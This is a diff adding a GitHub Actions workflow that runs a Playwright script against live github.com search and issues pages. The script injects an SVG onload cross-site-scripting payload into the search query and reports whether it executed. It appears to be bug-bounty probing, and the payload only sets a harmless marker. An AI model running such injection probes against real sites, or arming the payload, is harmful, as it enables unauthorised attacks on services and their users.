@@ -1,0 +1,61 @@
+name: GitHub Public XSS Probe
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - ".github/workflows/github-public-xss.yml"
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: npm install playwright@1.55.0
+      - run: npx playwright install chromium
+
+      - name: Test public GitHub renderers
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > github-public-xss.mjs <<'JS'
+          import { chromium } from "playwright";
+          const payload="<svg/onload=document.body.dataset.h1xss=1>";
+          const enc=encodeURIComponent(payload);
+          const targets=[
+            ["code-search","https://github.com/search?q="+enc+"&type=code"],
+            ["issue-search","https://github.com/search?q="+enc+"&type=issues"],
+            ["repo-search","https://github.com/search?q="+enc+"&type=repositories"],
+            ["global-search","https://github.com/search?q="+enc],
+            ["issues","https://github.com/issues?q="+enc]
+          ];
+          const browser=await chromium.launch({headless:true});
+          let found=false;
+          for(const [name,url] of targets){
+            const page=await browser.newPage();
+            try{
+              const resp=await page.goto(url,{waitUntil:"domcontentloaded",timeout:25000});
+              await page.waitForTimeout(1200);
+              const executed=await page.evaluate(()=>document.body?.dataset?.h1xss==="1");
+              const html=await page.content();
+              console.log("TEST",name,"STATUS",resp?.status()??null,"EXECUTED",executed,"MARKER",html.includes("dataset.h1xss"),"FINAL",page.url());
+              if(executed){
+                console.log("VERIFIED_FINDING",name,url);
+                found=true; break;
+              }
+            }catch(e){console.log("ERROR",name,String(e));}
+            finally{await page.close();}
+            await new Promise(r=>setTimeout(r,1500));
+          }
+          await browser.close();
+          if(!found) console.log("NO_VERIFIED_PUBLIC_XSS");
+          if(found) process.exit(42);
+          JS
+          node github-public-xss.mjs
